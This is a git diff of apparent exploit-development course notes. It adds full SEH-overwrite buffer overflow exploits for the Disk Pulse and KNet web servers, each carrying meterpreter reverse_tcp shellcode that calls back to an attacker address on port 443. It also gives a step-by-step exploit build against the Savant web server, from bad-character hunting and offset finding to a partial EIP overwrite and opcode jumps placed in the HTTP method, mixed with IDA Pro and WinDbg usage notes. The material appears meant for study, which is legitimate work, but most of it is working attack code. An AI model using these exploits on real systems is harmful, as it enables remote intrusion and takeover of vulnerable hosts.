@@ -2010,7 +2010,6 @@ nasm > ret
 }
 ```
 
-
 `u 1015a2f0 L3`
 
 ```
@@ -2097,7 +2096,7 @@ The first opcode of a short jump is always `0xEB` and the second opcode is the *
 - `0x00` - `0x7F` for forward short jumps,
 - `0x80` - `0xFF` for backwards short jumps.
 
-After single-stepping through the P/P/R instructions, we will use the `a` command to assemble the short jump and obtain its opcodes:
+After single-stepping through the P/P/R instructions, use the `a` command to assemble the short jump and **obtain its opcodes**:
 
 `dds eip L4`
 
@@ -2122,7 +2121,7 @@ jmp 0x018fff5c
 018fff54 eb06            jmp     018fff5c
 ```
 
-The offset for the jump is 6 bytes rather than 4 (the length of the P/P/R address). This is because the offset is calculated from the beginning of the jump instruction, which includes the `0xEB` and the offset itself.
+The offset for the jump is 6 bytes rather than 4 (the length of the `P/P/R` address). This is because the offset is calculated from the beginning of the jump instruction, which includes the `0xEB` and the offset itself.
 
 ```python
 try:
@@ -2399,9 +2398,14 @@ except socket.error:
 
 ### Disk Pulse
 
+`s -b 0 L?80000000 90 90 90 90 44 44 44 44 44 44 44 44`
+
+`dd 01aefc70 L65`
+
 ```python
-#!/usr/bin/python
+##!/usr/bin/python
 import socket, sys
+from struct import pack
 
 host = sys.argv[1]
 port = 80
@@ -2410,36 +2414,27 @@ size = 6000
 
 def send_exploit_request():
 
-    # badchars = (
-    # b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
-    # b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
-    # b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
-    # b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
-    # b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
-    # b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
-    # b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
-    # b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
-    # b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
-    # b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
-    # b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
-    # b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
-    # b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
-    # b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
-    # b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
-    # b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
-    # b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
-    # b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
-    # b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
-    # b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")    
 
-    # found_badchars = "\x00\x09\x0a\x0d\x20"
+    found_badchars = "\x00\x09\x0a\x0d\x20"
 
-    buffer = b"\x41" * 2499
-    buffer+= b"\x42\x42\x42\x42"
-    buffer+= badchars
+    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x09\x0a\x0d\x20" -f python -v shellcode
+    shellcode =  b""
+    shellcode += b"\xba\xf4\xfa\x3e\x25\xdb\xd0\xd9\x74\x24\xf4"
+    ....
+    shellcode += b"\x64\x51\x02\x52\x3a\xa1\x07"
+
+    buffer = b"\x90" * 20
+    buffer+= shellcode
+    buffer+= b"\x41" * (2495 - len(buffer))
+    
+    buffer+= pack("<L", (0x909006eb))  # (NSEH)
+    buffer+= pack("<L", (0x101576c0))  # (SEH) 0x101576c0 - pop eax; pop ebx; ret
+    buffer+= b"\x90" * 2
+    buffer+= b"\x66\x81\xc4\x8c\x05"  # add sp,0x58C
+    buffer+= b"\xff\xe4"
     buffer+= b"\x43" * (size - len(buffer))
 
-  #HTTP Request
+    #HTTP Request
     request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
     request += b"Host: " + host.encode() + b"\r\n"
     request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
@@ -2458,271 +2453,1888 @@ if __name__ == "__main__":
     send_exploit_request()
 ```
 
+### KNet
 
-```nasm
+```python
+#!/usr/bin/python
+import socket, sys
+from struct import pack
+
+host = sys.argv[1]
+port = 80
+size = 2000
+
+
+def send_exploit_request():
+
+    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=443 -b "\x00\x0d\x20\x2d\x2e\x2f" -f python -v shellcode
+    shellcode =  b""
+    shellcode += b"\xd9\xc0\xb8\x39\x86\x35\xad\xd9\x74\x24\xf4"
+    ...
+    shellcode += b"\xe7\x48\x85\x84\xbb\x8b\x8c"
+
+    buffer = b"\x90" * 20
+    buffer+= shellcode
+    buffer+= b"\x41" * (1236 - len(buffer))
+
+    # msf-pattern_offset -l 2000 -q 70423370
+    buffer+= pack("<L", (0x04eb9090))  # (NSEH)
+    buffer+= pack("<L", (0x10016190))  # (SEH) 0x10016190 - pop ebx; pop ebp; ret
+    buffer+= b"\x90" * 2
+    buffer+= b"\x66\x81\xc4\xfc\x06"  # add sp, 0x6fc 6681C4FC06
+    buffer+= b"\xff\xe4"
+    buffer+= b"\x43" * (size - len(buffer))
+
+    found_badchars = "\x00\x0d\x20\x2d\x2e\x2f"
+
+    #HTTP Request
+    request  = buffer + b" / HTTP/1.0\r\n\r\n"
+ 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(request)
+    print(s.recv(1024))
+    s.close()
+
+if __name__ == "__main__": 
+
+    send_exploit_request()
+```
+
+# IDA Pro
+
+For 32-bit Windows executables and Dynamic Link Libraries (DLLs), select the `Portable executable for 80386`. This is a common denominator for all 32bit x86 processors.
+
+Like WinDbg, IDA Pro can download and use symbols from the Microsoft server while disassembling the binary. This is only natively available if IDA Pro is installed on Windows.
+
+For versions other than IDA Freeware, it's possible to set up a symbols server on a Windows computer with a bundled `Win32_debugger` application.
+
+Options to save IDA Pro database:
+- `Pack database`: A file needs to be packed properly to be successfully saved to an `idb` database file, if we don't want to lose our changes.
+- `DON'T SAVE the database`: If we do not want to save our changes.
+
+## User Interface
+
+The main disassembly window can show the code organized in three 3 different ways:
+-	Graph view
+-	Text view
+-	Proximity view
+
+The **green and red arrows** originating from a **conditional branch** indicate if the condition was met or not respectively - like if and else in low level languages like C or C++.
+
+**Blue arrows** represent basic block edges, where only one potential successor block is present (JMP assembly instruction).
+
+Reposition the graph while analyzing a selected function by clicking and dragging the background of the `graph` view.
+
+The `text` view presents the entire disassembly listing of a program in a linear fashion. **Control flow** is still indicated by **arrows to the left of the listing**.
+
+Switch between graph view and text view by pressing `Space`.
+
+In the `text` view, **virtual addresses** are displayed for each instruction.
+
+=> Add this for the `graph` view by going to `Options > General` and ticking the `Line prefixes` box.
+ 
+`Proximity` view is for viewing and browsing the relationships between functions, global variables, and constants.
+
+Activate proximity view through `View > Open subviews > Proximity browser`.
+
+The `Functions` window provides a list of all the functions present in the program.
+ 
+Double-clicking an entry in the Functions window will cause IDA Pro to show the start of the selected function directly in the `disassembly` window.
+
+To easily navigate the disassembly of large functions, use the `Graph overview` window to rapidly pan around the function graph.
+
+A dotted outline in the Graph overview indicates which part of the code is currently displayed in the disassembly window.
+
+Navigate to previously viewed basic blocks using the `forward and backward arrows` in the navigation bar at the top left part of the IDA Pro window.
+ 
+To adjust a single window, place the cursor just below the title of the window. When a small bar appears, drag and dock the window next to other windows.
+ 
+Completely reset the UI using `Windows > Reset desktop`.
+
+## Basic Functionality
+
+`Coloring dialog box` - a combination of 2 **colors** can help show desired and undesired paths through basic blocks.
+
+**Comment** on a specific line of assembly code by placing the cursor at a specific line of code and pressing the colon (`:`) key
+
+**Rename a function** by locating it in the `Functions` window, right-clicking it, and selecting `Edit function....` or by pressing the `N` key when the function name is open in the main **assembly window**. This also applies to **global variables**.
+
+Create a **bookmark** by choosing the line we want to bookmark and pressing `Alt + M`
+
+Whenever we need to come back to the same location in the code, pressing `Ctrl + M` will bring up a dialog to select a bookmark. Double-clicking the bookmark name will jump the main disassembly window to the code in question.
+
+## Search Functionality
+
+Search for sequences of bytes, strings, and function names in a target executable or dynamic link library
+
+Search for an **immediate value**, such as a hardcoded DWORD or a specific sequence of bytes, from the `Search` menu or by using `Alt + I` and `Alt + B`, respectively.
+
+Search for **function names** in the `Functions` window or through the `Jump to function` command from the `Jump` menu. In the dialog window, right-click and use `Quick filter` to search for functions
+
+Search for **global variables** through the Jump by name... submenu
+
+All the imported and exported functions are available from the `Imports` and `Exports` tabs respectively. As with the Function window, we can right-click and apply a name filter using the `Quick filter` option to narrow our search.
+
+Use cross referencing (`xref`) to detect all **usages of a specific function or global variable** in the entire executable or DLL.
+
+To obtain the list of cross references for a function name or global variable, select its name from the `graph` view with the mouse cursor and press the `X` key.
+
+## Static-Dynamic Analysis Synchronization
+
+To make sure that the base address of the target executable in IDA Pro coincides with that of the debugged process in WinDbg.
+
+When a Windows executable or DLL file is compiled and linked, the PE header `ImageBase` field defines the preferred base address when loaded into memory.
+
+Often this will not be the address used at runtime, due to other circumstances such as colliding modules or the Address Space Layout Randomization (ASLR) security mitigation.
+
+When the two base addresses do not coincide, the analyzed file can be rebased in IDA Pro to match the address used by the application at runtime.
+
+Dump the base address of Notepad:
+
+`lm m notepad`
+
+```
+Browse full module list
+start    end        module name
+00f20000 00f5f000   notepad    (pdb symbols)  ...
+```
+
+Switch back to IDA Pro and navigate to the `Edit > Segments`, enter the new `image base` address.
+
+Once completed, all addresses, references, and global variables will match those found in WinDbg during the debugging session.
+
+If the application contains compiled debug information, rebasing it may sometimes break the symbols.
+
+`u notepad!GotoDlgProc`
+
+```
+notepad!GotoDlgProc:
+00f279e0 8bff            mov     edi,edi
+00f279e2 55              push    ebp
+00f279e3 8bec            mov     ebp,esp
+```
+
+Press `G` to bring up the `Jump to address` dialog box and enter the absolute address of the function to end up at the same location.
+
+## Tracing Notepad
+
+```bat
+echo Test > C:\Tools\doc.txt
+```
+
+Open Notepad and attach WinDbg to it.
+
+To perform any read or write actions on Windows, applications must obtain a **handle** to the file, commonly done with the `CreateFileW` function from `kernel32.dll`.
+
+Set a breakpoint on the API and attempt to open the file in Notepad:
+
+```
+bp kernel32!CreateFileW
+g
+```
+
+Turn to IDA Pro, locate `CreateFileW` in the `Imports` tab, and perform a **cross reference**. This provides us with 20 different possibilities.
+
+Let execution continue in the debugger until the end of `CreateFileW`, and return into the calling function:
+
+```
+pt
+p
+```
+
+```
+00f25085 8bd8            mov     ebx,eax
+```
+
+EAX also contains the handle to the file we'll use later (`eax=00000640`)
+
+We now have an address inside Notepad that we can use with IDA Pro.
+
+After jumping to the address, we find a basic block that sets up arguments and calls `CreateFileW`.
+
+=> Understand what arguments are supplied to the API, since IDA Pro lists their names as comments
+
+Follow the execution flow in IDA Pro and attempt to locate a call to `ReadFile` (within the same function that performed a call to `CreateFileW`).
+
+The instruction `push eax` at address `0xF250A4` is noted by IDA Pro as `lpBuffer`. This is a pointer to the memory buffer that receives the data read from a file.
+
+Continue execution to the call into `ReadFile`:
+
+```
+bp f250a6
+g
+dds esp L5
+```
+
+```
+007febf8  00000640
+007febfc  007fec28
+007fec00  00000400
+007fec04  007fec20
+007fec08  00000000
+```
+
+The first argument, is the same file handle returned by `CreateFileW` earlier.
+
+Step over the call to `ReadFile`:
+
+`p`
+
+`da 007fec28`
+
+```
+007fec28  "Test ..w."
+```
+
+# Overcoming Space Restrictions: Egghunters
+
+## Crashing the Savant Web Server
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+from struct import pack
+
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 260
+
+  httpMethod = b"GET /"
+  inputBuffer = b"\x41" * size
+  httpEndRequest = b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+
+  print("Sending evil buffer...")
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((server, port))
+  s.send(buf)
+  s.close()
+  
+  print("Done!")
+  
+except socket.error:
+  print("Could not connect!")
+```
+
+`dds @esp L5`
+
+```
+01b8ea2c  00414141 Savant+0x14141
+01b8ea30  01b8ea84
+01b8ea34  0041703c Savant+0x1703c
+01b8ea38  01805718
+01b8ea3c  01805718
+```
+
+- We only have 3 bytes available for our shellcode.
+- Our buffer is null-byte terminated.
+
+Increasing the size of the buffer by even 1 byte will cause a different crash where we do not gain control over the instruction pointer!
+
+`dds @esp L2`
+
+```
+01b8ea2c  00414141 Savant+0x14141
+01b8ea30  01b8ea84
+```
+
+`dc poi(esp+4)`
+
+```
+01b8ea84  00544547 00000000 00000000 00000000  GET.............
+01b8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
+01b8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+01b8eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+```
+
+The 2nd DWORD on the stack points to the **HTTP method**, followed by several null bytes and then our controlled buffer.
+
+## Detecting Bad Characters
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 260
+
+  badchars = (
+    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
+    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
+    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
+    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
+    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
+    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
+    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
+    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
+    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
+    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
+    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
+    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
+    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
+    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
+    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
+    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
+    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
+    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+  httpMethod = b"GET /"
+  inputBuffer = badchars
+  inputBuffer+= b"\x41" * (size - len(inputBuffer))
+  httpEndRequest = b"\r\n\r\n"
+...
+```
+
+Running the PoC against the vulnerable software does not seem to cause a crash. This is most likely the result of a bad character. 
+
+Comment out the first half of the lines from the badchars variable.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 260
+
+  badchars = (
+    #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
+    #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
+    #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
+    #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
+    #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
+    #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
+    #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
+    #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
+    #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
+    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
+    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
+    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
+    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
+    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
+    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
+    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
+    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
+    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    )
+
+  httpMethod = b"GET /"
+  inputBuffer = badchars
+  inputBuffer+= b"\x41" * (size - len(inputBuffer))
+  httpEndRequest = b"\r\n\r\n"
+...
+```
+
+Successfully overwrite the instruction pointer.
+
+=> The problematic characters are not present within the last half of the badchars variable, which is not commented out.
+
+Confirm that none of our characters have been mangled in memory:
+
+`db esp - 0n257`
+
+Repeat this process by uncommenting one line at the time.
+
+If the application does not crash, or if we encounter a different crash which does not overwrite the instruction pointer, we can safely assume that the previously uncommented line contains bad characters.
+
+Once we identify the problematic line of characters, send each character from that line individually to the application until we identify the bad characters.
+
+The list of all bad characters: `0x00, 0x0A, 0x0D, 0x25`
+
+## Gaining Code Execution
+
+```bash
+msf-pattern_create -l 260
+```
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+
+  httpMethod = b"GET /"
+  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
+  httpEndRequest = b"\r\n\r\n"
+...
+```
+
+Running the PoC above sometimes causes a different access violation.
+
+=> Identify the offset by splitting our buffer.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+
+  httpMethod = b"GET /"
+  inputBuffer = b"\x41" * 130
+  inputBuffer+= b"\x42" * 130
+  httpEndRequest = b"\r\n\r\n"
+...
+```
+
+The instruction pointer was overwritten with the `0x42424242` value.
+
+Further split the upper half of our buffer until we are able to accurately pinpoint the exact offset required to overwrite the instruction pointer with our 260-byte buffer.
+
+=> A buffer of `253` bytes required prior to overwriting the instruction pointer.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 260
+
+  httpMethod = b"GET /"
+  inputBuffer = b"\x41" * 253
+  inputBuffer+= b"\x42\x42\x42\x42"
+  inputBuffer+= b"\x43" * (size - len(inputBuffer))
+  httpEndRequest = b"\r\n\r\n"
+...
+```
+
+Find a good instruction to overwrite EIP with that will allow us to take control of the execution flow.
+
+To make our exploit as portable as possible, choose a module that comes with the application. The module should not be compiled with any protections.
+
+List the protections of the loaded modules.
+
+`.load narly`
+
+`!nmod`
+
+```
+00400000 00452000 Savant    /SafeSEH OFF    C:\Savant\Savant.exe
+```
+
+The `Savant.exe` module, compiled without any protections, seems to be mapped at an address that starts with a **null byte**.
+
+## Partial EIP Overwrite
+
+Recall that our buffer is treated as a string => A null byte is added at the end of it.
+
+Only overwrite the lower 3 bytes of the EIP register
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"GET /"
+  inputBuffer = b"\x41" * size
+  inputBuffer+= b"\x42\x42\x42"
+  httpEndRequest = b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+...
+```
+
+Our partial EIP overwrite was successful (`eip=00424242`).
+
+=> Use an instruction that is present inside the `Savant.exe` module.
+
+What instruction we want to redirect the execution flow to?
+
+One side-effect of our partial instruction pointer overwrite is that we cannot store any data past the return address.
+
+=> Cannot use an instruction like `JMP ESP` because the ESP register will not point to our buffer.
+
+The 2nd DWORD on the stack at the time of the crash points very close to our current stack pointer.
+
+`dds @esp L5`
+
+```
+02efea2c  02effe70
+02efea30  02efea84
+02efea34  0041703c Savant+0x1703c
+02efea38  003d56d0
+02efea3c  003d56d0
+```
+
+`dc poi(@esp+0x04)`
+
+```
+02efea84  00544547 00000000 00000000 00000000  GET.............
+02efea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
+02efeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+02efeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+02efeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+02efead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+02efeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+02efeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+```
+
+=> `POP R32; RET`
+
+=> We will have to execute the assembly instructions generated by the GET method opcodes.
+
+`u poi(@esp+0x04)`
+
+```
+02efea84 47              inc     edi
+02efea85 45              inc     ebp
+02efea86 54              push    esp
+02efea87 0000            add     byte ptr [eax],al
+02efea89 0000            add     byte ptr [eax],al
+02efea8b 0000            add     byte ptr [eax],al
+02efea8d 0000            add     byte ptr [eax],al
+02efea8f 0000            add     byte ptr [eax],al
+```
+
+The first three instructions do not seem to affect the execution flow or generate any access violations.
+
+The next instructions, generated by the null bytes after the HTTP method, use the `ADD` operation - the value of the `AL` register is added to the value that `EAX` is pointing to.
+
+These types of instructions can be problematic as they operate on the assumption that `EAX` points to a valid memory address.
+
+=> As part of the `POP` instruction from our sequence, place the DWORD that `ESP` points to into the register of our choice.
+
+Inspect the value that will be popped by the first instruction.
+
+`dds @esp L5`
+
+```
+02efea2c  02effe70
+02efea30  02efea84
+02efea34  0041703c Savant+0x1703c
+02efea38  003d56d0
+02efea3c  003d56d0
+```
+
+`!teb`
+
+```
+TEB at 7ffdc000
+    ExceptionList:        02efff70
+    StackBase:            02f00000
+    StackLimit:           02efc000
+    SubSystemTib:         00000000
+    ...
+```
+
+The 1st DWORD on the stack (`02effe70`) points to a memory location that is part of the stack space => a valid memory address.
+
+
+```bash
+msf-nasm_shell
+nasm > pop eax
+00000000  58                pop eax
+nasm > ret
+00000000  C3                ret
+```
+
+`lm m Savant`
+
+```
+Browse full module list
+start    end        module name
+00400000 00452000   Savant   C (no symbols)
+```
+
+`s -[1]b 00400000 00452000 58 c3`
+
+Choose a memory address that points to our instruction sequence and does not contain bad characters `0x00418674`.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"GET /"
+  inputBuffer = b"\x41" * size
+  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+...
+```
+
+While this solution works, executing assembly instructions generated by the opcodes of our HTTP method is not very clean.
+
+## Changing the HTTP Method
+
+`dc poi(@esp)`
+
+```
+0305ea84  00544547 00000000 00000000 00000000  GET.............
+0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
+0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+```
+
+Notice a padding of null bytes between the HTTP method and our other data.
+
+The buffer used to store the HTTP method seems to be allocated with a fixed size. It is quite large, based on what it's meant to store.
+
+=> Whether or not there are any checks implemented for the HTTP method?
+
+If there are no checks, attempt to replace it with opcodes for assembly instructions that jump to our `0x41` field buffer.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /"
+  inputBuffer = b"\x41" * size
+  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+...
+```
+
+```
+bp 0x00418674
+g
+```
+
+`dc poi(@esp+4)`
+
+```
+0304ea84  43434343 43434343 00000000 00000000  CCCCCCCC........
+0304ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
+0304eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0304eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+0304eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+```
+
+Successfully change our HTTP method to an invalid one without affecting the crash.
+
+Use a short jump of `0x17` bytes (Not correct)
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\xeb\x17\x90\x90" + b" /"  # Short jump of 0x17
+  inputBuffer = b"\x41" * size
+  inputBuffer+= pack("<L", (0x418674))      # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+...
+```
+
+Set a breakpoint at the address of our `POP EAX; RET` instruction sequence.
+
+```
+t
+t
+```
+
+`u @eip`
+
+```
+0306ea84 cb              retf
+0306ea85 17              pop     ss
+0306ea86 90              nop
+0306ea87 90              nop
+0306ea88 0000            add     byte ptr [eax],al
+0306ea8a 0000            add     byte ptr [eax],al
+0306ea8c 0000            add     byte ptr [eax],al
+0306ea8e 0000            add     byte ptr [eax],al
+```
+
+Instead of our short jump assembly instruction, we get an unexpected `RETF` instruction.
+
+Different memory allocations will have different operations and checks performed on the data stored in them.
+
+=> We may find a completely different set of bad characters than initially discovered.
+
+## Conditional Jumps
+
+To use the conditional jump `JE`, we need to guarantee that the `ZF` will always be `1` (TRUE).
+
+```bash
+msf-nasm_shell
+nasm > xor ecx, ecx
+00000000  31C9              xor ecx,ecx
+
+nasm > test ecx, ecx
+00000000  85C9              test ecx,ecx
+
+nasm > je 0x17
+00000000  0F8411000000      jz near 0x17
+```
+
+Both `JE` and `JZ` conditional jumps check if the `ZF` is set as a condition. Because of this, they have the same opcodes and various tools will use them interchangeably.
+
+The opcodes generated above do not seem to include bad characters except for the conditional jump opcodes, which include 3 null bytes.
+
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 80
+  size = 253
+
+  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
+  inputBuffer = b"\x41" * size
+  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
+  httpEndRequest = b"\r\n\r\n"
+
+  buf = httpMethod + inputBuffer +  httpEndRequest
+...
+```
+
+Before we execute the `ret` instruction
+
+`u poi(@esp) L3`
+
+```
+02feea84 31c9            xor     ecx,ecx
+02feea86 85c9            test    ecx,ecx
+02feea88 0f8411000000    je      02feea9f
+```
+
+Before we execute the conditional jump
+
+`r @zf`
+
+```
+zf=1
+```
+
+Execute the conditional jump 
+
+`db @eip L100`
+
+```
+02feea9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+02feeaaf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+...
+02feeb7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
+02feeb8f  41 41 41 41 41 41 41 41-41 41 41 74 86 41 00 00
+```
+
+`? 02feeb8f + 0n11 - @eip`
+
+```
+Evaluate expression: 251 = 000000fb
+```
+
+Not enough space!
+
+## Finding Alternative Places to Store Large Buffers
+
+If we can store a second, larger buffer elsewhere, we can use our current, smaller buffer space to write a stage one shellcode (to redirect the execution flow to that second buffer)
+
